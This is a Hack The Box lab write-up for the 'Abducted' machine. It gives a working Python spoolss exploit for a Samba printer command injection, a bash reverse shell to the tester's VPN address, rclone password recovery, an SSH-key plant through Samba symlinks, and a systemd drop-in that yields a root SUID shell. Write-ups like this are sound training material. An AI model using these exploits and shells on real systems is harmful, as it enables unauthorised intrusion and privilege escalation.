# Hack The Box — Abducted

**Machine:** Abducted
**Difficulty:** Medium
**OS:** Linux
**Target IP:** `10.129.244.177`

## 1. Enumeration

Start with an Nmap scan:

```bash
nmap -sSVC --open -Pn 10.129.244.177
```
The target exposed:

```text
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  netbios-ssn
```
The SSH service identified an Ubuntu host and SMB identified the machine as a Samba server.
Enumerate the SMB shares anonymously:

```bash
smbclient -L //10.129.244.177 -N
```
The server exposed:

```text
Sharename       Type      Comment
---------       ----      -------
HP-Reception    Printer   Reception printer
projects        Disk      Hartley Group Project Files
transfer        Disk      Staff file transfer
IPC$            IPC       IPC Service
```
Check the SMB server information:

```bash
rpcclient -U "" -N 10.129.244.177 -c "srvinfo"
```
This confirmed anonymous SMB access.
The important finding was the guest-accessible `HP-Reception` printer.

---

# 2. Identify the Samba RCE

The intended vulnerability is **CVE-2026-4480**, a command injection in Samba's printing subsystem.
The vulnerable flow is:

```text
client-supplied document name
        ↓
%J print-command substitution
        ↓
shell execution
```
The write-up states that the vulnerable host uses a print command equivalent to:

```text
/usr/local/bin/printaudit %J %s
```
and that the job name reaches `%J` without sufficient shell escaping.
A normal `smbclient` print operation is not sufficient because the legacy print interface sanitizes dangerous characters. The write-up therefore uses the **spoolss RPC interface directly**.

---

# 3. Build the spoolss exploit

Create the exploit:

```bash
nano exploit.py
```
The first-stage payload was deliberately harmless and used only to verify command execution:

```python
#!/usr/bin/env python3

from samba.dcerpc import spoolss
from samba.param import LoadParm
from samba.credentials import Credentials

RHOST = "10.129.244.177"
LHOST = "10.10.14.160"

DATA = b"ping -c 3 10.10.14.160\n"

lp = LoadParm()
lp.load_default()

creds = Credentials()
creds.guess(lp)
creds.set_anonymous()

iface = spoolss.spoolss(
    r"ncacn_np:%s[\pipe\spoolss]" % RHOST,
    lp,
    creds
)

h = iface.OpenPrinter(
    "\\\\%s\\HP-Reception" % RHOST,
    "",
    spoolss.DevmodeContainer(),
    0x00000008
)

i1 = spoolss.DocumentInfo1()
i1.document_name = "|sh"
i1.output_file = None
i1.datatype = "RAW"

ctr = spoolss.DocumentInfoCtr()
ctr.level = 1
ctr.info = i1

iface.StartDocPrinter(h, ctr)
iface.StartPagePrinter(h)
iface.WritePrinter(h, DATA, len(DATA))
iface.EndPagePrinter(h)
iface.EndDocPrinter(h)
iface.ClosePrinter(h)

print("[+] job submitted")
```
The sequence follows the intended spooler lifecycle:

```text
OpenPrinter
StartDocPrinter
StartPagePrinter
WritePrinter
EndPagePrinter
EndDocPrinter
ClosePrinter
```
`EndDocPrinter` is the point at which the print command is triggered.

---

# 4. Verify command execution with ICMP

My Kali VPN interface was:

```text
10.10.14.160
```
Start tcpdump:

```bash
sudo tcpdump -ni tun0 icmp and host 10.129.244.177
```
Then run:

```bash
python3 exploit.py
```
The target sent three ICMP requests:

```text
11:19:23.586114 IP 10.129.244.177 > 10.10.14.160: ICMP echo request
11:19:24.658515 IP 10.129.244.177 > 10.10.14.160: ICMP echo request
11:19:25.682556 IP 10.129.244.177 > 10.10.14.160: ICMP echo request
```
with corresponding replies.
This conclusively confirmed:

```text
Unauthenticated Samba command execution
```
The supplied walkthrough uses this exact out-of-band ICMP validation before replacing the payload with a reverse shell.

---

# 5. Get a reverse shell as `nobody`

Replace the ICMP payload with the detached reverse shell:

```python
DATA = (
    "setsid bash -c 'bash -i >& /dev/tcp/10.10.14.160/4444 0>&1' "
    ">/dev/null 2>&1 &\n"
).encode()
```
The `setsid` and backgrounding are important because the print command executes synchronously and a foreground reverse shell would block the Samba RPC call.
Start the listener on Kali:

```bash
sudo nc -lvnp 4444
```
Then run:

```bash
python3 exploit.py
```
The listener received:

```text
connect to [10.10.14.160] from (UNKNOWN) [10.129.244.177]
```
The shell was:

```text
nobody@abducted:/var/spool/samba$
```
Confirm:

```bash
id
whoami
```
The write-up expects:

```text
uid=65534(nobody) gid=65534(nogroup)
```

---

# 6. Recover the backup password

From the `nobody` shell:

```bash
cat /opt/offsite-backup/rclone.conf
```
The configuration contained:

```text
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```
The password is rclone-obscured rather than encrypted.
Use rclone itself:

```bash
rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
```
It returned:

```text
iXzvcib3SrpZ
```
So:

```text
svc-backup password = iXzvcib3SrpZ
```
The supplied walkthrough explicitly states that rclone's `obscure` format is reversible using rclone's own tooling, and that the recovered password is reused for `scott`.

---

# 7. SSH as Scott

The `nobody` account had no usable home directory, so SSH was cleaner from Kali.
From Kali:

```bash
ssh -p 22 scott@10.129.244.177
```
Password:

```text
iXzvcib3SrpZ
```
After login:

```bash
whoami
id
```
Result:

```text
uid=1000(scott) gid=1001(scott) groups=1001(scott)
```
The password reuse and SSH step match the supplied walkthrough.

---

# 8. Capture the user flag

As `scott`:

```bash
cat ~/user.txt
```
The write-up identifies this as the user-flag stage.
The user flag was obtained from `/home/scott/user.txt`.

---

# 9. Enumerate Samba configuration for privilege escalation

Read the Samba share configuration:

```bash
cat /etc/samba/shares.conf
```
The important share:

```text
[transfer]
path = /srv/transfer
valid users = scott
force user = marcus
read only = no
wide links = yes
browseable = yes
```
Then check the global SMB configuration:

```bash
grep -E 'unix extensions|wide links' /etc/samba/smb.conf
```
Relevant settings:

```text
unix extensions = no
allow insecure wide links = yes
```
This combination is dangerous:

```text
scott authentication
       ↓
Samba force user
       ↓
operations performed as marcus
       ↓
wide links
       ↓
Samba can follow symlinks outside /srv/transfer
```
The write-up uses this to place an SSH key inside Marcus's home directory.

---

# 10. Create an SSH key

As `scott`:

```bash
ssh-keygen -q -t ed25519 -N '' -f /tmp/k
```
Create a symbolic link:

```bash
ln -s /home/marcus /srv/transfer/mh
```
Then access the transfer share through Samba:

```bash
smbclient //127.0.0.1/transfer \
  -U 'scott%iXzvcib3SrpZ' \
  -c 'mkdir mh/.ssh; put /tmp/k.pub mh/.ssh/authorized_keys'
```
The write operation creates:

```text
/home/marcus/.ssh/authorized_keys
```
and, because of `force user = marcus`, the file is owned by Marcus.

---

# 11. SSH as Marcus

Use the private key generated earlier:

```bash
ssh -i /tmp/k marcus@10.129.244.177
```
Confirm:

```bash
id
```
Result:

```text
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```
This puts us in the `operators` group.

---

# 12. Find the writable systemd drop-in directory

Check:

```bash
ls -ld /etc/systemd/system/smbd.service.d
```
Our machine returned:

```text
drwxrws--- 2 root operators 4096 Sep  8 06:00 /etc/systemd/system/smbd.service.d
```
The important part is:

```text
root operators
```
combined with group write permission.
Because Marcus belongs to `operators`, he can create systemd drop-in configuration files there.
The supplied walkthrough explains that such a drop-in is merged into `smbd.service` and directives such as `ExecStartPre=` execute with the service's privileges. `smbd` runs as root.

---

# 13. Check polkit permissions

The relevant polkit actions can be enumerated with:

```bash
for action in $(pkaction); do
    pkcheck --action-id "$action" --process $$ 2>/dev/null && \
    echo "ALLOWED: $action"
done
```
The important permission is:

```text
ALLOWED: org.freedesktop.systemd1.reload-daemon
```
The walkthrough also explains that the `smbd.service` management authorization is conditional and applies when `systemctl` targets `smbd.service`.
This means the two findings combine:

```text
operators
    ↓
write smbd.service drop-in
    +
polkit permission
    ↓
reload/restart smbd
    ↓
root executes the drop-in
```

---

# 14. Create the malicious systemd drop-in

As `marcus`:

```bash
cat > /etc/systemd/system/smbd.service.d/override.conf <<'EOF'
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/.rb
ExecStartPre=/bin/chmod 4755 /tmp/.rb
EOF
```
Verify:

```bash
cat /etc/systemd/system/smbd.service.d/override.conf
```
Output:

```text
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/.rb
ExecStartPre=/bin/chmod 4755 /tmp/.rb
```

---

# 15. Reload systemd and restart Samba

First:

```bash
systemctl daemon-reload
```
Then:

```bash
systemctl restart smbd
```
The restart causes systemd, running with root privileges, to execute the two `ExecStartPre` commands.
Verify:

```bash
ls -l /tmp/.rb
```
Our target returned:

```text
-rwsr-xr-x 1 root root 1446024 Sep  8 06:04 /tmp/.rb
```
The `s` in `rws` indicates the SUID bit. The binary is owned by root.

---

# 16. Execute Bash with preserved privileges

Run:

```bash
/tmp/.rb -p -c 'id'
```
Output:

```text
uid=1001(marcus) gid=1002(marcus) euid=0(root) groups=1002(marcus),1000(operators)
```
The important value is:

```text
euid=0(root)
```
We now have effective root privileges.

---

# 17. Capture the root flag

Finally:

```bash
/tmp/.rb -p -c 'cat /root/root.txt'
```
Our root flag:

```text
c8971eef67b178768f46ab647f4a62e4
```

---

# Complete Attack Chain

```text
                    ABDUCTED
                        │
                        ▼
              Nmap: 22 / 139 / 445
                        │
                        ▼
                 Anonymous SMB
                        │
                        ▼
               HP-Reception printer
                        │
                        ▼
             CVE-2026-4480
                        │
                        ▼
              spoolss command injection
                        │
                        ▼
                    nobody
                        │
                        ▼
             /opt/offsite-backup
                  rclone.conf
                        │
                        ▼
             rclone reveal
                        │
                        ▼
             iXzvcib3SrpZ
                        │
                        ▼
                    scott
                        │
                        ▼
               user.txt
                        │
                        ▼
       Samba force user + wide links
                        │
                        ▼
         SSH authorized_keys injection
                        │
                        ▼
                    marcus
                        │
                        ▼
                  operators
                        │
                        ▼
       writable smbd.service.d drop-in
                        │
                        ▼
              polkit/systemd access
                        │
                        ▼
            root-owned SUID bash
                        │
                        ▼
                      root
                        │
                        ▼
                    root.txt
```

# Credentials Discovered

```text
svc-backup:
iXzvcib3SrpZ

scott:
iXzvcib3SrpZ
```

# Flags

```text
User flag:
<your /home/scott/user.txt value>

Root flag:
c8971eef67b178768f46ab647f4a62e4
```

# Key Takeaways

**CVE-2026-4480:** A guest-accessible Samba printer can become an unauthenticated RCE vector when the print command uses an unsafe `%J` substitution.
**spoolss vs smbclient:** Ordinary SMB printing was not enough because the legacy client path sanitized the payload. Direct spoolss RPC was required.
**Blind RCE validation:** ICMP was used before deploying the reverse shell, giving a clean proof that the server-side command executed.
**rclone credentials:** Rclone's obscured credentials can be reversed with rclone itself.
**force user + wide links:** Samba's `force user = marcus` combined with insecure wide links allowed `scott` to create Marcus-owned files outside the share tree.
**systemd + polkit:** A writable root service drop-in becomes especially dangerous when an unprivileged group is authorized to reload/restart the affected service.
**Final escalation:** A root-owned SUID copy of Bash provides effective UID 0 with `bash -p`.
